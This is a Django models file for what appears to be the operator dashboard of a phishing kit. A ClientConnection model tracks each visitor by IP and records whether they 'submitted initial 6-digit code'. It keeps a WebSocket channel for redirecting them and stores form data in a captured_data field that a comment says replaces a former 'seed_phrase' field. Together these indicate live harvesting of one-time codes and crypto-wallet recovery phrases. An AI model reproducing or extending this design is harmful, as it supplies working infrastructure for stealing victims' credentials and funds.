# dashboard/models.py

from django.db import models
from django.contrib.auth.models import User
from django.db.models.signals import post_save
from django.dispatch import receiver
from django.utils import timezone
from django.conf import settings

# --- SiteSetting Model (Singleton) ---
class SiteSetting(models.Model):
    key = models.CharField(
        max_length=50,
        primary_key=True,
        default='global_settings',
        editable=False
    )
    cloudflare_site_key = models.CharField(
        max_length=255,
        blank=True,
        null=True,
        help_text="Cloudflare Turnstile Site Key"
    )
    cloudflare_secret_key = models.CharField(
        max_length=255,
        blank=True,
        null=True,
        help_text="Cloudflare Turnstile Secret Key"
    )
    enable_captcha = models.BooleanField(
        default=False,
        help_text="Enable Cloudflare CAPTCHA on non-admin/login pages"
    )
    # e.g. panel_status_online = models.BooleanField(default=True)
    #     log_visitor = models.BooleanField(default=False)

    def save(self, *args, **kwargs):
        # Always enforce the singleton primary key
        self.pk = 'global_settings'
        super().save(*args, **kwargs)

    def delete(self, *args, **kwargs):
        # Prevent deletion of the singleton
        pass

    @classmethod
    def load(cls):
        # Get or create the single SiteSetting instance
        obj, created = cls.objects.get_or_create(pk='global_settings')
        return obj

    def __str__(self):
        return "Site Settings"

    class Meta:
        verbose_name_plural = "Site Settings"


# --- Profile Model ---
class Profile(models.Model):
    user = models.OneToOneField(
        User,
        on_delete=models.CASCADE,
        related_name='profile'
    )
    avatar = models.ImageField(
        default='avatars/default_avatar.png',
        upload_to='avatars/',
        blank=True,
        null=True
    )
    role = models.CharField(
        max_length=50,
        default='User',
        blank=True
    )
    security_question = models.CharField(
        max_length=255,
        blank=True,
        null=True
    )
    # For real recovery flows, you’d store the answer hashed:
    # security_answer_hash = models.CharField(max_length=128, blank=True, null=True)

    def __str__(self):
        return f'{self.user.username} Profile'

    @property
    def avatar_url(self):
        if self.avatar and hasattr(self.avatar, 'url'):
            return self.avatar.url
        # Fallback to a static image if MEDIA_URL isn’t set or file’s missing
        return "/static/dashboard/images/default_avatar.png"


# Signal: create or update Profile whenever a User is saved
@receiver(post_save, sender=User)
def create_or_update_user_profile(sender, instance, created, **kwargs):
    if created:
        Profile.objects.create(user=instance)
    else:
        # In case a Profile was removed or missing
        Profile.objects.get_or_create(user=instance)
    # Ensure the Profile is saved (runs any update logic)
    instance.profile.save()



class ClientConnection(models.Model):

    # Core Identifiers
    # client_id is the session key, ip_address is the network IP.
    # We are currently keying off ip_address for uniqueness in the table.
    client_id = models.CharField(max_length=100, help_text="Client's session key (updated on each visit by same IP)")
    ip_address = models.GenericIPAddressField(unique=True, db_index=True) # Made IP unique and indexed
    
    # Status and Activity
    status = models.CharField(max_length=20, default='hidden', choices=[('visible', 'Visible'), ('hidden', 'Hidden')])
    is_connected = models.BooleanField(default=False, help_text="True if the user has 'connected' (e.g., submitted initial 6-digit code)")
    last_seen = models.DateTimeField(default=timezone.now)
    first_seen = models.DateTimeField(auto_now_add=True)

    # Page and Navigation
    current_page_name = models.CharField(max_length=100, blank=True, null=True, help_text="Friendly name of the current page")
    current_page_url = models.CharField(max_length=2048, blank=True, null=True)
    # current_page_icon_class = models.CharField(max_length=50, blank=True, null=True) # Or derive this from page_name/url

    # Device and Browser Info
    user_agent = models.TextField(blank=True, null=True)
    browser_name = models.CharField(max_length=100, blank=True, null=True)
    browser_version = models.CharField(max_length=50, blank=True, null=True)
    device_type = models.CharField(max_length=50, blank=True, null=True) # e.g., Mobile, Desktop, Tablet
    os_name = models.CharField(max_length=100, blank=True, null=True)
    os_version = models.CharField(max_length=50, blank=True, null=True)

    # Location
    timezone = models.CharField(max_length=100, blank=True, null=True)
    language = models.CharField(max_length=50, blank=True, null=True, help_text="Client's preferred language")
    # city = models.CharField(max_length=100, blank=True, null=True) # Consider adding if you parse GeoIP
    # country = models.CharField(max_length=100, blank=True, null=True) # Consider adding if you parse GeoIP

    # WebSocket channel name for direct communication (e.g., for redirects)
    activity_socket_channel_name = models.CharField(max_length=255, blank=True, null=True, help_text="Channel name for the client's activity WebSocket")

    # **** MODIFIED/NEW FIELD for storing captured data ****
    # This replaces your old 'connection_data' CharField and 'seed_phrase' TextField
    captured_data = models.JSONField(
        default=dict,
        blank=True,
        help_text="Stores arbitrary data captured from various forms/services (e.g., {'service_name': {'field1': 'value1', ...}})"
    )
    # **** END MODIFICATION ****

    def get_page_display_info(self):
        stored_friendly_page_name = self.current_page_name or "Unknown Page"
        default_icon = 'fas fa-file-alt'
        
        # Iterate through settings.PAGE_NAME_MAPPING to find the icon
        # for the stored friendly name.
        if hasattr(settings, 'PAGE_NAME_MAPPING'):
            for url_name_key, meta_value in settings.PAGE_NAME_MAPPING.items():
                if meta_value['name'] == stored_friendly_page_name:
                    return {'name': stored_friendly_page_name, 'icon_class': meta_value['icon_class']}
        
        # Fallback if no specific mapping found for the friendly name
        return {'name': stored_friendly_page_name, 'icon_class': default_icon}

    # For easier frontend data structuring
    def to_dict(self):
        page_info = self.get_page_display_info()
        
        return {
            'id': self.ip_address,
            'db_id': self.pk, # Actual database primary key
            'ip': self.ip_address,
            'original_client_id': self.client_id, # Session key
            'status': self.status, # Will be updated by JS visibility API via Channels
            'page': page_info,
            'browser': self.browser_name or 'Unknown',
            'device': self.device_type or 'Unknown',
            'timezone': self.timezone or 'UTC', # Will be updated by JS via Channels
            'captured_data': self.captured_data, # Add the new field here
            'userAgent': self.user_agent,
            'language': self.language or 'en',
            # ... other fields like referrer, screenResolution, cookiesEnabled would be populated by JS if needed
            'referrer': '',
            'screenResolution': '', # From JS
            'cookiesEnabled': None, # From JS
        }

    def __str__(self):
        return f"{self.ip_address} (Session: {self.client_id}) - {self.status} on {self.current_page_name or 'Unknown'}"

    class Meta:
        ordering = ['-last_seen']
        verbose_name = "Client Connection"
        verbose_name_plural = "Client Connections"